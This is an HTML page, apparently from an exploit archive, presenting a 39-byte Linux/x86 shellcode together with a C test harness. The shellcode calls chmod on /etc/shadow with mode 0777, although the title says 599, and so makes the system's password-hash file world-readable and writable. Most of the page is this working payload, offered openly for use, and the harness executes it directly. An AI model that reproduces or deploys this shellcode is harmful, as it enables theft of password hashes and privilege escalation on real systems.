<html><head><title>Linux/x86 - sys_chmod(/etc/shadow, 599) - 39 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
0     _                   __           __       __                     1
1   /' \            __  /'__`\        /\ \__  /'__`\                   0
0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
1  \/_/\ \ /' _ `\ \/\ \/_/_\_&lt;_  /'___\ \ \/\ \ \ \ \/\`'__\          0
0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
1                  \ \____/ &gt;&gt; Exploit database separated by exploit   0
0                   \/___/          type (local, remote, DoS, etc.)    1
1                                                                      1
0  [+] Site            : Inj3ct0r.com                                  0
1  [+] Support e-mail  : submit[at]inj3ct0r.com                        1
0                                                                      0
1               #########################################              1
0               I'm gunslinger_ member from Inj3ct0r Team              1
1               #########################################              0
0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1
/*
Title  : change mode 0777 of &quot;/etc/shadow&quot; with sys_chmod syscall
Name   : 39 bytes sys_chmod(&quot;/etc/shadow&quot;,599) x86 linux shellcode
Date   : jun, 1 2010
Author : gunslinger_ &lt;yudha.gunslinger[at]gmail.com&gt;
Web    : devilzc0de.com
blog   : gunslingerc0de.wordpress.com
tested on : linux debian
*/

#include &lt;stdio.h&gt;

char *shellcode=
 &quot;\xeb\x15&quot;                    /* jmp    0x8048077 */
 &quot;\x31\xc0&quot;                    /* xor    %eax,%eax */
 &quot;\xb0\x0f&quot;                    /* mov    $0xf,%al */
 &quot;\x5b&quot;                        /* pop    %ebx */
 &quot;\x31\xc9&quot;                    /* xor    %ecx,%ecx */
 &quot;\x66\xb9\xff\x01&quot;            /* mov    $0x1ff,%cx */
 &quot;\xcd\x80&quot;                    /* int    $0x80 */
 &quot;\x31\xc0&quot;                    /* xor    %eax,%eax */
 &quot;\xb0\x01&quot;                    /* mov    $0x1,%al */
 &quot;\x31\xdb&quot;                    /* xor    %ebx,%ebx */
 &quot;\xcd\x80&quot;                    /* int    $0x80 */
 &quot;\xe8\xe6\xff\xff\xff&quot;        /* call   0x8048062 */
 &quot;\x2f&quot;                        /* das     */
 &quot;\x65&quot;                        /* gs */
 &quot;\x74\x63&quot;                    /* je     0x80480e3 */
 &quot;\x2f&quot;                        /* das     */
 &quot;\x73\x68&quot;                    /* jae    0x80480eb */
 &quot;\x61&quot;                        /* popa    */
 &quot;\x64\x6f&quot;                    /* outsl  %fs &quot;(%esi),(%dx) */
 &quot;\x77&quot;;                        /* .byte 0x77 */

int main(void)
{
		fprintf(stdout,&quot;Length: %d\n&quot;,strlen(shellcode));
		((void (*)(void)) shellcode)();
		return 0;
}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
